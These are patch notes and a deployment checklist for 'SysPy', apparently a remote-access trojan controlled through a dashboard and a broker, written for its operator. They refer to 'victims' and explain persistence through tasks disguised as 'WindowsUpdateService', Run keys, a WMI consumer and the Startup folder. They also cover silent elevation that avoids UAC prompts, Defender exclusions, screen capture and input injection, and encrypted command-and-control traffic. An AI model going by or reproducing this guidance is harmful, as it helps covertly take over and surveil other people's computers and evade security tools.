# SysPy patch notes

Applied by `patch.py`. Target version 5.2.0.

The rule followed throughout: **nothing stealthy, persistent, surveilling,
injecting or spreading was removed.** Every change is one of OBSERVABLE,
ROBUST, REVERTIBLE or SAFE. The only behaviour deleted was accidental.

## Deployment checklist (do these, in order)

1. `python patch.py --genkey` and put the two values in your environment:

       SYSPY_SIGN_KEY=<64 hex>
       SYSPY_PUBKEY=<64 hex>

   Without them everything still works, but updates are only HMAC-protected
   rather than signed. With them, knowing the passphrase no longer means
   arbitrary code execution on the fleet.

2. Set `SYSPY_ROOM` and `SYSPY_PASS` **before the first victim** and never change
   them. Changing either changes the namespace, so old and new agents stop
   seeing each other.

3. Self-host the broker with `allow_anonymous false`, and set
   `SYSPY_BROKER` / `SYSPY_BROKER_USER` / `SYSPY_BROKER_PASS`.

4. Set `SYSPY_PASSWORD` (else it is regenerated on every boot and printed to
   stdout, which on Render is a public log stream).

5. Move to a paid Render plan and mount a disk, then set `SYSPY_DATA=/var/data`.
   On the free tier the data directory is wiped on every deploy.

6. Optionally set `SYSPY_WU_TOKEN` to stop `/wu` being world-readable, and
   `SYSPY_ALLOWED_HOSTS` to pin the Host header.

7. Push the new build to existing agents from the dashboard. A patched
   controller speaks the legacy envelope to a pre-patch agent and the new one to
   a patched agent, so there is no flag day -- but agents only gain the fixes
   once they are updated.

## UAC behaviour (the bit that matters)

Elevation has exactly two sources, and **neither of them prompts**:

* the `WindowsUpdateService` ONLOGON task, created `/RL HIGHEST /IT /RU <user>`.
  `/IT` stores no password, so an unelevated agent can create it, and Task
  Scheduler launches it elevated with no UAC dialog.
* the `WindowsUpdateServiceBoot` ONSTART task, created `/RU SYSTEM`.

Everything else -- both `Run` values, the Startup folder entry, the WMI consumer
and `WindowsUpdateService.cmd` -- passes `--no-elevate`, so it can never prompt.

The one prompt a victim ever sees is the explicit install-time elevation.

Guards, in order, before any UAC decision is made:

1. `stealth.agent_already_running()` -- a cross-session global mutex. A sibling
   launcher now notices an *elevated* agent it could never have seen through the
   pid file, and stands down.
2. A session-0 agent with a user logged on hands the lock to the interactive
   task and exits, so the desktop works.
3. Only then does a boot claim decide whether to elevate, at most once per boot,
   and the winner is launched with `--takeover <pid>` so the loser waits for it
   rather than racing it.

## Session-0 handover

A `CommandLineEventConsumer` and a `/RU SYSTEM` task both land in session 0,
where there is no interactive desktop: no screen capture, no input injection, no
foreground window. Now:

* the WMI consumer's command prefers `schtasks /Run /TN WindowsUpdateService`
  (interactive, with a desktop) and falls back to the vbs;
* a headless agent yields to the interactive task within ~5 s of a user logging
  on;
* the watchdog is the single place that decides which tier should be running, so
  there is never a spawn loop.

## Three uninstall levels, identical in the CLI, the dashboard and the README

| level | CLI | keeps |
| --- | --- | --- |
| stop | `agent.py --stop`, `stop` | everything; agent returns at next logon |
| uninstall (soft) | `agent.py --uninstall`, `uninstall` | autostart vectors when `?protect=1` |
| purge (hard) | `agent.py --purge`, `purge` | nothing; also reverts Defender exclusions and removes the anchor, runtime and temp staging |

`purge` now also removes the Startup `.vbs` it used to miss, the Defender
exclusions it used to leave dangling, and `%TEMP%\syspy-kit` / `wu-*.zip`.

## Wire format

v2 envelope: `"S2" | alg(1) | keyid(4) | nonce(12) | ciphertext | tag(32)`, with
separate HKDF-derived encryption and MAC subkeys, and the header covered by the
MAC. Legacy `nonce(8) | ct | tag` is still readable, and decoding auto-detects,
so a patched and an unpatched peer interoperate in both directions.

The agent declares `fmt` and `proto` in every hello. The hub keys its codec
cache on `(agent, fmt)`.

## Known remaining limits

* `PBKDF2` for the transport key is still 60 000 rounds. Raising it is a flag
  day: set `SYSPY_KDF_ITER` on both sides only when every agent has been updated.
* The dashboard password KDF is now 600 000 rounds (local, no compat issue).
* The `CSP` is deliberately permissive so it cannot break an existing UI. Tighten
  `SYSPY_CSP` once you know your asset origins.
* The beacon is cleartext by design; it now carries an HMAC so a hostile LAN host
  cannot forge `bye` records.
* The received-file folder is now stable per agent id, but files received before
  the patch under a name-derived folder are not migrated.
